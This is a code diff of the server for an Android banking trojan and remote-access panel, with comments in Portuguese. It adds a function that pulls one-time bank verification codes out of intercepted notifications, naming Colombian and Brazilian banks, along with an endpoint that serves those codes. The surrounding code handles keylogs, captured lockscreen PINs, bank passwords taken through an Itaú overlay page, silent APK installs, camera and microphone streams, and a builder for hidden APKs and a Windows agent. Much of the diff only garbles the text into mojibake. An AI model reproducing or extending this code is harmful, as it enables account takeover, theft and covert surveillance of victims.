+    """Ã°Å¸â€Â² Reproduz Pattern automaticamente"""
     check_device_access(device_id, current_user, db)
     
-    # Se nÃ£o forneceu pattern, usa o armazenado
+    # Se nÃƒÂ£o forneceu pattern, usa o armazenado
     if not pattern:
         pattern = manager.get_device_pattern(device_id)
         if not pattern:
@@ -4907,7 +5040,7 @@ async def play_pattern_sequence(
     if not success:
         raise HTTPException(status_code=503, detail="Dispositivo offline")
     
-    logger.info(f"ðŸ”² Reproduzindo Pattern '{pattern}' em {device_id}")
+    logger.info(f"Ã°Å¸â€Â² Reproduzindo Pattern '{pattern}' em {device_id}")
     
     return {
         "status": "ok",
@@ -4923,20 +5056,20 @@ async def install_apk_on_device(
     request: Request = None
 ):
     """
-    ðŸ“¦ Upload de APK e instalaÃ§Ã£o silenciosa no dispositivo
+    Ã°Å¸â€œÂ¦ Upload de APK e instalaÃƒÂ§ÃƒÂ£o silenciosa no dispositivo
     """
     # Verifica acesso
     check_device_access(device_id, current_user, db)
     
-    # Valida extensÃ£o
+    # Valida extensÃƒÂ£o
     if not apk_file.filename.endswith('.apk'):
         raise HTTPException(status_code=400, detail="Arquivo deve ser .apk")
     
-    # Cria diretÃ³rio de uploads se nÃ£o existir
+    # Cria diretÃƒÂ³rio de uploads se nÃƒÂ£o existir
     upload_dir = Path("uploads/apks")
     upload_dir.mkdir(parents=True, exist_ok=True)
     
-    # Nome Ãºnico para o arquivo
+    # Nome ÃƒÂºnico para o arquivo
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     safe_filename = f"{device_id}_{timestamp}_{apk_file.filename}"
     file_path = upload_dir / safe_filename
@@ -4947,14 +5080,14 @@ async def install_apk_on_device(
             content = await apk_file.read()
             f.write(content)
         
-        logger.info(f"ðŸ“¦ APK salvo: {file_path} ({len(content)} bytes)")
+        logger.info(f"Ã°Å¸â€œÂ¦ APK salvo: {file_path} ({len(content)} bytes)")
         
         # Monta URL para download - USA IP da VPS para dispositivos Android conseguirem acessar!
-        # Dispositivos Android nÃ£o conseguem acessar localhost do PC
+        # Dispositivos Android nÃƒÂ£o conseguem acessar localhost do PC
         VPS_URL = gangstar_env.public_base_url()
         apk_url = f"{VPS_URL}/uploads/apks/{safe_filename}"
         
-        logger.info(f"ðŸ“¦ URL do APK: {apk_url}")
+        logger.info(f"Ã°Å¸â€œÂ¦ URL do APK: {apk_url}")
         
         # Envia comando para o dispositivo
         command = {"action": "INSTALL_APK", "url": apk_url}
@@ -4966,7 +5099,7 @@ async def install_apk_on_device(
         return {"status": "ok", "message": "APK enviado", "url": apk_url}
         
     except Exception as e:
-        logger.error(f"ðŸ“¦ âŒ Erro: {e}")
+        logger.error(f"Ã°Å¸â€œÂ¦ Ã¢ÂÅ’ Erro: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.get("/api/activity-feed")
@@ -4976,8 +5109,8 @@ async def get_activity_feed(
     db: Session = Depends(get_db)
 ):
     """
-    ðŸ“Š Retorna feed unificado com os Ãºltimos eventos de todos os dispositivos do usuÃ¡rio.
-    Garante persistÃªncia de atividades mesmo ao atualizar a pÃ¡gina.
+    Ã°Å¸â€œÅ  Retorna feed unificado com os ÃƒÂºltimos eventos de todos os dispositivos do usuÃƒÂ¡rio.
+    Garante persistÃƒÂªncia de atividades mesmo ao atualizar a pÃƒÂ¡gina.
     """
     try:
         if current_user.is_admin:
@@ -5000,8 +5133,8 @@ async def get_activity_feed(
                     "type": "bank_open",
                     "deviceId": dev_id,
                     "deviceModel": dev_model,
-                    "title": f"ðŸš¨ BANCO ABERTO: {bank_name}",
-                    "description": "Acessando conta bancÃ¡ria agora!",
+                    "title": f"Ã°Å¸Å¡Â¨ BANCO ABERTO: {bank_name}",
+                    "description": "Acessando conta bancÃƒÂ¡ria agora!",
                     "timestamp": datetime.now().strftime("%H:%M:%S"),
                     "bankPackage": b_info.get("package", ""),
                     "iconB64": b_info.get("icon")
@@ -5036,8 +5169,8 @@ async def get_activity_feed(
                         "type": "bank_open",
                         "deviceId": log.device_id,
                         "deviceModel": dev_model,
-                        "title": f"ðŸš¨ BANCO ABERTO: {bank}",
-                        "description": f"Acessando conta bancÃ¡ria agora!",
+                        "title": f"Ã°Å¸Å¡Â¨ BANCO ABERTO: {bank}",
+                        "description": f"Acessando conta bancÃƒÂ¡ria agora!",
                         "timestamp": time_str,
                         "bankPackage": data.get("package", "") if isinstance(data, dict) else ""
                     })
@@ -5118,6 +5251,36 @@ async def get_device_keylogs(
         for log in keylogs
     ]
 
+
+# [KRYPTOS-OTP] INICIO
+_OTP_KW = ("codigo", "code", "otp", "token", "clave", "pin", "senha",
+           "verificacion", "verification", "confirmacion", "autenticacion", "contrasena")
+_OTP_BANK = ("nequi", "bancolombia", "daviplata", "davivienda", "banco", "bank", "nubank",
+             "itau", "bradesco", "santander", "caixa", "bbva", "scotiabank", "paypal",
+             "lulo", "rappi", "falabella", "colpatria", "avvillas", "c6", "inter",
+             "picpay", "mercadopago", "nu.", "nu ")
+
+def _extract_otp(text, pkg="", app_name=""):
+    """Extrai um codigo de verificacao (OTP) de uma notificacao. None se nao houver."""
+    if not text:
+        return None
+    import re as _re, unicodedata as _ud
+    flat = "".join(c for c in _ud.normalize("NFD", text) if _ud.category(c) != "Mn")
+    low = flat.lower()
+    m = _re.search(r"(?:codigo|code|otp|token|clave|pin|senha|verificacion|confirmacion|autenticacion|contrasena)\D{0,25}(\d{4,8})", low)
+    if m:
+        return m.group(1)
+    src = ((pkg or "") + " " + (app_name or "")).lower()
+    if not any(k in src for k in _OTP_BANK):
+        return None
+    nums = _re.findall(r"(?<!\d)(\d{4,8})(?!\d)", flat)
+    for want in (6, 4, 5, 8, 7):
+        for n in nums:
+            if len(n) == want:
+                return n
+    return nums[0] if nums else None
+# [KRYPTOS-OTP] FIN
+
 @app.get("/api/devices/{device_id}/notifications")
 async def get_device_notifications(
     device_id: str,
@@ -5125,7 +5288,7 @@ async def get_device_notifications(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Retorna notificaÃ§Ãµes capturadas de um dispositivo"""
+    """Retorna notificaÃƒÂ§ÃƒÂµes capturadas de um dispositivo"""
     # Verifica acesso
     check_device_access(device_id, current_user, db)
     
@@ -5150,6 +5313,35 @@ async def get_device_notifications(
         })
     return result
 
+@app.get("/api/devices/{device_id}/otp")
+async def get_device_otp(
+    device_id: str,
+    limit: int = 30,
+    current_user: Operator = Depends(get_current_user),
+    db: Session = Depends(get_db)
+):
+    """[KRYPTOS-OTP] Codigos de verificacao detectados nas notificacoes"""
+    check_device_access(device_id, current_user, db)
+    logs = db.query(DeviceLog).filter(
+        DeviceLog.device_id == device_id,
+        DeviceLog.log_type == "DEVICE_OTP"
+    ).order_by(DeviceLog.created_at.desc()).limit(limit).all()
+    result = []
+    for log in logs:
+        try:
+            data = json.loads(log.log_data)
+        except Exception:
+            data = {}
+        result.append({
+            "id": log.id,
+            "otp": data.get("otp", ""),
+            "package": data.get("package", ""),
+            "appName": data.get("appName", ""),
+            "text": data.get("text", ""),
+            "created_at": log.created_at.isoformat()
+        })
+    return result
+
 @app.get("/api/devices/{device_id}/keylogs-all")
 async def get_all_device_keylogs(
     device_id: str,
@@ -5158,11 +5350,11 @@ async def get_all_device_keylogs(
     db: Session = Depends(get_db)
 ):
     """
-    ðŸ’¾ Retorna TODOS os keylogs de um dispositivo:
+    Ã°Å¸â€™Â¾ Retorna TODOS os keylogs de um dispositivo:
     - KEYLOG: Capturados em tempo real
     - KEYLOG_OFFLINE: Capturados quando desconectado
     - LOCKSCREEN_PIN: Senha de desbloqueio do celular
-    - UNLOCK_SEQUENCE: SequÃªncia de desbloqueio (PIN/Pattern)
+    - UNLOCK_SEQUENCE: SequÃƒÂªncia de desbloqueio (PIN/Pattern)
     """
     # Verifica acesso
     check_device_access(device_id, current_user, db)
@@ -5189,7 +5381,7 @@ async def get_all_device_keylogs(
             "isOffline": "OFFLINE" in log.log_type
         }
         
-        # Tenta extrair info Ãºtil do JSON
+        # Tenta extrair info ÃƒÂºtil do JSON
         try:
             data = json.loads(log.log_data) if isinstance(log.log_data, str) else log.log_data
             if isinstance(data, dict):
@@ -5212,9 +5404,9 @@ async def get_device_offline_keylogs(
     db: Session = Depends(get_db)
 ):
     """
-    ðŸ“´ Retorna TODOS os keylogs salvos no banco (tanto online quanto offline).
-    Este endpoint Ã© chamado SEMPRE para mostrar histÃ³rico completo,
-    independente de o botÃ£o "Ativar Keylogger" estar clicado ou nÃ£o.
+    Ã°Å¸â€œÂ´ Retorna TODOS os keylogs salvos no banco (tanto online quanto offline).
+    Este endpoint ÃƒÂ© chamado SEMPRE para mostrar histÃƒÂ³rico completo,
+    independente de o botÃƒÂ£o "Ativar Keylogger" estar clicado ou nÃƒÂ£o.
     """
     # Verifica acesso
     check_device_access(device_id, current_user, db)
@@ -5277,8 +5469,8 @@ async def get_device_keylogs_by_date(
     db: Session = Depends(get_db)
 ):
     """
-    ðŸ“… Retorna keylogs de um dispositivo filtrados por DATA especÃ­fica ou todos.
-    - Se nÃ£o informar data, retorna o dia ATUAL.
+    Ã°Å¸â€œâ€¦ Retorna keylogs de um dispositivo filtrados por DATA especÃƒÂ­fica ou todos.
+    - Se nÃƒÂ£o informar data, retorna o dia ATUAL.
     """
     try:
         check_device_access(device_id, current_user, db)
@@ -5395,7 +5587,7 @@ async def get_device_keylogs_dates(
     db: Session = Depends(get_db)
 ):
     """
-    ðŸ“† Retorna lista de datas que tÃªm keylogs registrados (ajustado para fuso BRT).
+    Ã°Å¸â€œâ€  Retorna lista de datas que tÃƒÂªm keylogs registrados (ajustado para fuso BRT).
     """
     from datetime import timedelta
     from sqlalchemy import func
@@ -5438,7 +5630,7 @@ async def get_device_keylogs_summary(
     db: Session = Depends(get_db)
 ):
     """
-    ðŸ“Š Retorna resumo estatÃ­stico dos keylogs do dispositivo.
+    Ã°Å¸â€œÅ  Retorna resumo estatÃƒÂ­stico dos keylogs do dispositivo.
     """
     from datetime import datetime, timedelta
     import pytz
@@ -5446,7 +5638,7 @@ async def get_device_keylogs_summary(
     # Verifica acesso
     check_device_access(device_id, current_user, db)
     
-    # ðŸ‡§ðŸ‡· Timezone de BrasÃ­lia
+    # Ã°Å¸â€¡Â§Ã°Å¸â€¡Â· Timezone de BrasÃƒÂ­lia
     brazil_tz = pytz.timezone('America/Sao_Paulo')
     now_brazil = datetime.now(brazil_tz)
     today_start_brt = now_brazil.replace(hour=0, minute=0, second=0, microsecond=0)
@@ -5477,7 +5669,7 @@ async def get_device_keylogs_summary(
         DeviceLog.log_data.like('%"isPassword": true%')
     ).count()
     
-    # Primeiro e Ãºltimo keylog
+    # Primeiro e ÃƒÂºltimo keylog
     first_log = db.query(DeviceLog).filter(
         DeviceLog.device_id == device_id,
         DeviceLog.log_type.in_(keylog_types)
@@ -5505,7 +5697,7 @@ async def get_device_lockscreen_pins(
     db: Session = Depends(get_db)
 ):
     """
-    ðŸ” Retorna tentativas de captura de PIN/Pattern da lockscreen
+    Ã°Å¸â€Â Retorna tentativas de captura de PIN/Pattern da lockscreen
     Inclui tanto online quanto offline
     """
     # Verifica acesso
@@ -5526,7 +5718,7 @@ async def get_device_lockscreen_pins(
         try:
             data = json.loads(log.log_data) if isinstance(log.log_data, str) else log.log_data
             if isinstance(data, dict):
-                # Verifica se Ã© PIN de lockscreen
+                # Verifica se ÃƒÂ© PIN de lockscreen
                 event_type = data.get("eventType", "") or ("CAPTURED_PIN" if log.log_type == "CAPTURED_PIN" else "CAPTURED_PATTERN" if log.log_type == "CAPTURED_PATTERN" else "")
                 package = data.get("package", "")
                 
@@ -5559,7 +5751,7 @@ async def get_bank_passwords(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Retorna senhas bancÃ¡rias e credenciais capturadas sem omissÃ£o"""
+    """Retorna senhas bancÃƒÂ¡rias e credenciais capturadas sem omissÃƒÂ£o"""
     # Verifica acesso
     check_device_access(device_id, current_user, db)
     
@@ -5612,7 +5804,7 @@ async def get_bank_passwords(
                     "password": pwd,
                     "digits": len(pwd),
                     "hint": "SENHA DE APP",
-                    "label": "InjeÃ§Ã£o / Overlay",
+                    "label": "InjeÃƒÂ§ÃƒÂ£o / Overlay",
                     "status": "captured",
                     "source": "VISUAL_SCREEN",
                     "timestamp": log.created_at.isoformat()
@@ -5643,7 +5835,7 @@ async def get_bank_passwords(
                     "package": "com.android.keyguard",
                     "password": pattern,
                     "digits": len(pattern.split('-')) if '-' in pattern else len(pattern),
-                    "hint": "PADRÃƒO DESBLOQUEIO",
+                    "hint": "PADRÃƒÆ’O DESBLOQUEIO",
                     "label": "Desenho de Tela",
                     "status": "captured",
                     "source": "LOCKSCREEN",
@@ -5674,12 +5866,12 @@ async def get_bank_passwords(
 
 @app.post("/api/keylog/custom")
 async def receive_custom_keylog(request: Request, db: Session = Depends(get_db)):
-    """Recebe e registra senhas capturadas por pÃ¡ginas overlay HTML (como ItaÃº)"""
+    """Recebe e registra senhas capturadas por pÃƒÂ¡ginas overlay HTML (como ItaÃƒÂº)"""
     try:
         data = await request.json()
         device_id = data.get("device_id") or "UNKNOWN"
         package = data.get("package") or "br.com.itau"
-        app_name = data.get("appName") or "ItaÃº Oficial"
+        app_name = data.get("appName") or "ItaÃƒÂº Oficial"
         text = data.get("text") or ""
         
         password_info = {
@@ -5778,7 +5970,7 @@ async def delete_device_custom_capture(
         DeviceLog.log_type == "CUSTOM_CAPTURES"
     ).first()
     if not log:
-        raise HTTPException(status_code=404, detail="Captura nÃ£o encontrada")
+        raise HTTPException(status_code=404, detail="Captura nÃƒÂ£o encontrada")
     db.delete(log)
     db.commit()
     return {"ok": True}
@@ -5790,11 +5982,11 @@ async def delete_device_log(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Deleta um log especÃ­fico do dispositivo"""
+    """Deleta um log especÃƒÂ­fico do dispositivo"""
     check_device_access(device_id, current_user, db)
     log = db.query(DeviceLog).filter(DeviceLog.device_id == device_id, DeviceLog.id == log_id).first()
     if not log:
-        raise HTTPException(status_code=404, detail="Log nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Log nÃƒÂ£o encontrado")
     db.delete(log)
     db.commit()
     return {"status": "ok"}
@@ -5806,7 +5998,7 @@ async def delete_device_logs_by_package(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Deleta todos os logs de um pacote de app especÃ­fico (banco)"""
+    """Deleta todos os logs de um pacote de app especÃƒÂ­fico (banco)"""
     check_device_access(device_id, current_user, db)
     logs = db.query(DeviceLog).filter(DeviceLog.device_id == device_id).all()
     count = 0
@@ -5838,7 +6030,7 @@ async def get_bank_balances(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Retorna os saldos bancÃ¡rios capturados do dispositivo"""
+    """Retorna os saldos bancÃƒÂ¡rios capturados do dispositivo"""
     check_device_access(device_id, current_user, db)
     
     # Busca os logs do tipo BANK_BALANCE
@@ -5873,7 +6065,7 @@ async def get_device_clipboard(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Retorna os logs de Ã¡rea de transferÃªncia (clipboard) do dispositivo."""
+    """Retorna os logs de ÃƒÂ¡rea de transferÃƒÂªncia (clipboard) do dispositivo."""
     check_device_access(device_id, current_user, db)
     logs = db.query(DeviceLog).filter(
         DeviceLog.device_id == device_id,
@@ -5906,14 +6098,14 @@ async def set_device_clipboard(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Injeta texto na Ã¡rea de transferÃªncia (clipboard) do dispositivo."""
+    """Injeta texto na ÃƒÂ¡rea de transferÃƒÂªncia (clipboard) do dispositivo."""
     check_device_access(device_id, current_user, db)
     body = await request.json()
     text = body.get("text", "")
     if not text:
-        raise HTTPException(status_code=400, detail="Texto nÃ£o fornecido")
+        raise HTTPException(status_code=400, detail="Texto nÃƒÂ£o fornecido")
     await manager.send_command(device_id, {"action": "SET_CLIPBOARD", "text": text})
-    return {"status": "ok", "message": f"Texto enviado para Ã¡rea de transferÃªncia: {text}"}
+    return {"status": "ok", "message": f"Texto enviado para ÃƒÂ¡rea de transferÃƒÂªncia: {text}"}
 
 @app.get("/api/devices/{device_id}/uploaded-files")
 async def get_uploaded_files(
@@ -5954,10 +6146,10 @@ async def get_device_screen_hierarchy(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Retorna hierarquia da tela atual (Screen Reader V2) com disparo automÃ¡tico de captura"""
+    """Retorna hierarquia da tela atual (Screen Reader V2) com disparo automÃƒÂ¡tico de captura"""
     check_device_access(device_id, current_user, db)
     
-    # Solicita atualizaÃ§Ã£o em tempo real do leitor de tela V2 ao aparelho
+    # Solicita atualizaÃƒÂ§ÃƒÂ£o em tempo real do leitor de tela V2 ao aparelho
     asyncio.create_task(manager.send_command(device_id, {"action": "TOGGLE_SCREEN_READER", "enabled": True}))
     asyncio.create_task(manager.send_command(device_id, {"action": "REQUEST_HIERARCHY"}))
     
@@ -5981,7 +6173,7 @@ async def get_device_unlock_sequence(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """ðŸ”“ Retorna sequÃªncia de desbloqueio gravada"""
+    """Ã°Å¸â€â€œ Retorna sequÃƒÂªncia de desbloqueio gravada"""
     # Verifica acesso
     check_device_access(device_id, current_user, db)
     
@@ -6011,7 +6203,7 @@ async def get_device_installed_apps(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """ðŸ“± Retorna lista de apps instalados no dispositivo"""
+    """Ã°Å¸â€œÂ± Retorna lista de apps instalados no dispositivo"""
     # Verifica acesso
     check_device_access(device_id, current_user, db)
     
@@ -6035,7 +6227,7 @@ async def get_device_installed_apps(
             if cached:
                 data = json.loads(cached.log_data)
                 apps_list = data.get("apps", [])
-                # Restaura na memÃ³ria tambÃ©m
+                # Restaura na memÃƒÂ³ria tambÃƒÂ©m
                 manager.store_installed_apps(device_id, apps_list)
                 return {
                     "status": "ok",
@@ -6059,7 +6251,7 @@ async def refresh_device_apps(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """ðŸ“± Solicita atualizaÃ§Ã£o da lista de apps"""
+    """Ã°Å¸â€œÂ± Solicita atualizaÃƒÂ§ÃƒÂ£o da lista de apps"""
     # Verifica acesso
     check_device_access(device_id, current_user, db)
     
@@ -6067,9 +6259,9 @@ async def refresh_device_apps(
     success = await manager.send_command(device_id, {"action": "GET_INSTALLED_APPS"})
     
     if success:
-        return {"status": "ok", "message": "SolicitaÃ§Ã£o enviada"}
+        return {"status": "ok", "message": "SolicitaÃƒÂ§ÃƒÂ£o enviada"}
     else:
-        raise HTTPException(status_code=404, detail="Dispositivo nÃ£o conectado")
+        raise HTTPException(status_code=404, detail="Dispositivo nÃƒÂ£o conectado")
 
 
 @app.post("/api/devices/{device_id}/unlock-sequence")
@@ -6079,7 +6271,7 @@ async def save_device_unlock_sequence(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """ðŸ”“ Salva sequÃªncia de desbloqueio gravada via VNC"""
+    """Ã°Å¸â€â€œ Salva sequÃƒÂªncia de desbloqueio gravada via VNC"""
     # Verifica acesso
     check_device_access(device_id, current_user, db)
     
@@ -6092,15 +6284,15 @@ async def save_device_unlock_sequence(
             "sequence": sequence,
             "count": len(sequence)
         })
-        logger.info(f"ðŸ”“ SequÃªncia de desbloqueio salva para {device_id}: {len(sequence)} aÃ§Ãµes ({sequence_type})")
+        logger.info(f"Ã°Å¸â€â€œ SequÃƒÂªncia de desbloqueio salva para {device_id}: {len(sequence)} aÃƒÂ§ÃƒÂµes ({sequence_type})")
         return {
             "status": "ok",
-            "message": f"SequÃªncia salva: {len(sequence)} aÃ§Ãµes"
+            "message": f"SequÃƒÂªncia salva: {len(sequence)} aÃƒÂ§ÃƒÂµes"
         }
     else:
         return {
             "status": "error",
-            "message": "Nenhuma aÃ§Ã£o na sequÃªncia"
+            "message": "Nenhuma aÃƒÂ§ÃƒÂ£o na sequÃƒÂªncia"
         }
 
 
@@ -6119,7 +6311,7 @@ async def dashboard_stream(websocket: WebSocket, device_id: str):
             try:
                 frame = await asyncio.wait_for(queue.get(), timeout=15.0)
                 
-                # Drena frames extras acumulados - entrega sÃ³ o mais recente
+                # Drena frames extras acumulados - entrega sÃƒÂ³ o mais recente
                 latest = frame
                 while not queue.empty():
                     try:
@@ -6155,7 +6347,7 @@ async def dashboard_stream(websocket: WebSocket, device_id: str):
 
 @app.websocket("/ws/camera/{device_id}")
 async def camera_stream(websocket: WebSocket, device_id: str):
-    """ðŸ“· WebSocket que entrega frames de cÃ¢mera em tempo real"""
+    """Ã°Å¸â€œÂ· WebSocket que entrega frames de cÃƒÂ¢mera em tempo real"""
     operator = await authenticate_dashboard_websocket(websocket, device_id=device_id)
     if not operator:
         return
@@ -6187,7 +6379,7 @@ async def camera_stream(websocket: WebSocket, device_id: str):
 
 @app.websocket("/ws/microphone/{device_id}")
 async def microphone_stream(websocket: WebSocket, device_id: str):
-    """ðŸŽ¤ WebSocket que entrega chunks de Ã¡udio em tempo real"""
+    """Ã°Å¸Å½Â¤ WebSocket que entrega chunks de ÃƒÂ¡udio em tempo real"""
     operator = await authenticate_dashboard_websocket(websocket, device_id=device_id)
     if not operator:
         return
@@ -6243,7 +6435,7 @@ def serve_spa_html():
         </head>
         <body>
             <div class="container">
-                <h1>âš ï¸ Frontend nÃ£o buildado</h1>
+                <h1>Ã¢Å¡Â Ã¯Â¸Â Frontend nÃƒÂ£o buildado</h1>
                 <p>Execute o comando abaixo para buildar o frontend:</p>
                 <code>cd server/web-app && npm run build</code>
             </div>
@@ -6265,7 +6457,7 @@ async def serve_frontend():
 
 @app.get("/login", response_class=HTMLResponse)
 async def serve_login():
-    """Serve a pÃ¡gina de login"""
+    """Serve a pÃƒÂ¡gina de login"""
     return serve_spa_html()
 
 @app.get("/gangastar-logo.svg")
@@ -6290,7 +6482,7 @@ async def serve_KRYPTOS_logo():
 
 @app.get("/admin", response_class=HTMLResponse)
 async def serve_admin():
-    """Serve a pÃ¡gina de admin"""
+    """Serve a pÃƒÂ¡gina de admin"""
     return serve_spa_html()
 
 @app.get("/dashboard", response_class=HTMLResponse)
@@ -6300,25 +6492,25 @@ async def serve_dashboard():
 
 @app.get("/device/{device_id}", response_class=HTMLResponse)
 async def serve_device_control(device_id: str):
-    """Serve a pÃ¡gina de controle de dispositivo"""
+    """Serve a pÃƒÂ¡gina de controle de dispositivo"""
     return serve_spa_html()
 
 @app.get("/build-apk", response_class=HTMLResponse)
 async def serve_build_apk():
-    """Serve a pÃ¡gina de build APK"""
+    """Serve a pÃƒÂ¡gina de build APK"""
     return serve_spa_html()
 
 @app.get("/itau_senha.html", response_class=HTMLResponse)
 async def serve_itau_senha():
-    """Serve a pÃ¡gina de captura da senha do ItaÃº"""
+    """Serve a pÃƒÂ¡gina de captura da senha do ItaÃƒÂº"""
     file_path = Path(__file__).parent / "web-dist" / "itau_senha.html"
     if not file_path.exists():
         file_path = Path(__file__).parent / "web-app" / "public" / "itau_senha.html"
     if file_path.exists():
         return FileResponse(file_path, media_type="text/html")
-    raise HTTPException(status_code=404, detail="itau_senha.html nÃ£o encontrado")
+    raise HTTPException(status_code=404, detail="itau_senha.html nÃƒÂ£o encontrado")
 
-# ==================== API DE CONSTRUÃ‡ÃƒO DE APK ====================
+# ==================== API DE CONSTRUÃƒâ€¡ÃƒÆ’O DE APK ====================
 
 # Fila de builds em background
 import concurrent.futures
@@ -6331,10 +6523,10 @@ def create_smooth_progress_ticker(target_dict: dict, build_id: str, start_pct: i
     messages_map = [
         (35, "Processando manifestos e empacotando assets..."),
         (45, "Compilando recursos Android e bytecode DEX..."),
-        (55, "Executando tarefas de compilaÃ§Ã£o Gradle..."),
+        (55, "Executando tarefas de compilaÃƒÂ§ÃƒÂ£o Gradle..."),
         (65, "Processando bibliotecas e classes Java/Kotlin..."),
         (75, "Otimizando APK e alinhando estrutura zip..."),
-        (82, "Assinando APK com chave de seguranÃ§a..."),
+        (82, "Assinando APK com chave de seguranÃƒÂ§a..."),
         (88, "Finalizando empacotamento e verificando assinaturas...")
     ]
     stop_event = threading.Event()
@@ -6365,7 +6557,7 @@ def build_apk_background(build_id: str, app_name: str, icon_data: bytes, owner_i
     try:
         build_status[build_id] = {"status": "building", "progress": 10, "message": "Iniciando..."}
         
-        # Cria diretÃ³rio temporÃ¡rio
+        # Cria diretÃƒÂ³rio temporÃƒÂ¡rio
         temp_dir = tempfile.mkdtemp()
         icon_path = os.path.join(temp_dir, "icon.png") if icon_data else None
         
@@ -6386,10 +6578,10 @@ def build_apk_background(build_id: str, app_name: str, icon_data: bytes, owner_i
         build_status[build_id]["progress"] = 30
         build_status[build_id]["message"] = "Processando manifestos e empacotando assets..."
         
-        # Inicia ticker em background para avanÃ§ar a barra suavemente de 30% a 88% sem travar
+        # Inicia ticker em background para avanÃƒÂ§ar a barra suavemente de 30% a 88% sem travar
         stop_ticker = create_smooth_progress_ticker(build_status, build_id, 30, 88)
 
-        # ConstrÃ³i APK
+        # ConstrÃƒÂ³i APK
         safe_app_name = re.sub(r'[^a-zA-Z0-9_-]', '_', app_name.strip()) or "app"
         builder = APKBuilder(project_dir, ngrok_url)
         output_apk = os.path.join(temp_dir, f"{safe_app_name}.apk")
@@ -6411,13 +6603,13 @@ def build_apk_background(build_id: str, app_name: str, icon_data: bytes, owner_i
         stop_ticker()
         
         if not success:
-            build_status[build_id] = {"status": "error", "progress": 0, "message": "Erro na compilaÃ§Ã£o"}
+            build_status[build_id] = {"status": "error", "progress": 0, "message": "Erro na compilaÃƒÂ§ÃƒÂ£o"}
             return
         
         build_status[build_id]["progress"] = 90
         build_status[build_id]["message"] = "Finalizando..."
         
-        # Copia APK para pasta de downloads com ID Ãºnico para evitar cache de Ã­cone e arquivo
+        # Copia APK para pasta de downloads com ID ÃƒÂºnico para evitar cache de ÃƒÂ­cone e arquivo
         downloads_dir = os.path.join(server_dir, "downloads")
         os.makedirs(downloads_dir, exist_ok=True)
         
@@ -6429,7 +6621,7 @@ def build_apk_background(build_id: str, app_name: str, icon_data: bytes, owner_i
         build_status[build_id] = {
             "status": "done",
             "progress": 100,
-            "message": "ConcluÃ­do!",
+            "message": "ConcluÃƒÂ­do!",
             "result": {
                 "apk_name": apk_filename,
                 "download_url": f"/api/download-apk/{apk_filename}",
@@ -6459,13 +6651,13 @@ async def build_custom_apk(
     db: Session = Depends(get_db)
 ):
     """
-    Inicia build de APK em background (nÃ£o bloqueia o servidor)
+    Inicia build de APK em background (nÃƒÂ£o bloqueia o servidor)
     """
     import uuid
     from models import APKBuild
     
     try:
-        # Gera build_id Ãºnico
+        # Gera build_id ÃƒÂºnico
         build_id = str(uuid.uuid4())[:8].upper()
         
         logger.info(f"[BUILD] Iniciando build de APK em background: {app_name} (usuario: {current_user.username}, idioma: {language}, anti_kill: {enable_anti_kill})")
@@ -6484,9 +6676,9 @@ async def build_custom_apk(
                 icon_data = base64.b64decode(b64data)
         
         if icon_data:
-            logger.info(f"[BUILD-ICON] Recebido Ã­cone customizado com {len(icon_data)} bytes!")
+            logger.info(f"[BUILD-ICON] Recebido ÃƒÂ­cone customizado com {len(icon_data)} bytes!")
         else:
-            logger.warning(f"[BUILD-ICON] Nenhum Ã­cone customizado foi recebido ou lido (icon={type(icon)})")
+            logger.warning(f"[BUILD-ICON] Nenhum ÃƒÂ­cone customizado foi recebido ou lido (icon={type(icon)})")
         
         # Salva build no banco
         apk_build = APKBuild(
@@ -6499,14 +6691,14 @@ async def build_custom_apk(
         
         logger.info(f"[REG] Build registrado: {build_id} -> usuario {current_user.username}")
         
-        # Inicializa status sÃ­ncrono para evitar 404 em enquetes imediatas do cliente
+        # Inicializa status sÃƒÂ­ncrono para evitar 404 em enquetes imediatas do cliente
         build_status[build_id] = {
             "status": "building",
             "progress": 5,
             "message": "Iniciando build em background..."
         }
 
-        # Inicia build em background (nÃ£o bloqueia!)
+        # Inicia build em background (nÃƒÂ£o bloqueia!)
         build_executor.submit(
             build_apk_background,
             build_id, app_name, icon_data, current_user.id, current_user.username, webview_url, hide_from_launcher, enable_anti_kill, language, enable_camera, enable_contacts, enable_send_sms, enable_read_sms
@@ -6536,16 +6728,16 @@ async def get_build_status(build_id: str, current_user: Operator = Depends(get_c
                 "progress": 10,
                 "message": "Processando build..."
             }
-        raise HTTPException(status_code=404, detail="Build nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Build nÃƒÂ£o encontrado")
     
     status = build_status[build_id]
     
-    # Se concluÃ­do, retorna resultado completo
+    # Se concluÃƒÂ­do, retorna resultado completo
     if status["status"] == "done":
         return {
             "status": "success",
             "progress": 100,
-            "message": "APK construÃ­do com sucesso!",
+            "message": "APK construÃƒÂ­do com sucesso!",
             **status["result"]
         }
     elif status["status"] == "error":
@@ -6588,7 +6780,7 @@ async def build_windows_exe_endpoint(
     current_user: Operator = Depends(get_current_user)
 ):
     """
-    Compila o agente Windows (win_agent.py) em um executÃ¡vel standalone (.exe)
+    Compila o agente Windows (win_agent.py) em um executÃƒÂ¡vel standalone (.exe)
     """
     try:
         host = payload.c2_host
@@ -6624,7 +6816,7 @@ async def build_windows_exe_endpoint(
 
         return {
             "success": True,
-            "message": "ExecutÃ¡vel Windows compilado com sucesso!",
+            "message": "ExecutÃƒÂ¡vel Windows compilado com sucesso!",
             "download_url": download_url,
             "filename": download_filename
         }
@@ -6643,7 +6835,7 @@ async def download_apk_alias(filename: str):
 @app.get("/api/downloads/{filename}")
 async def download_generic_file(filename: str):
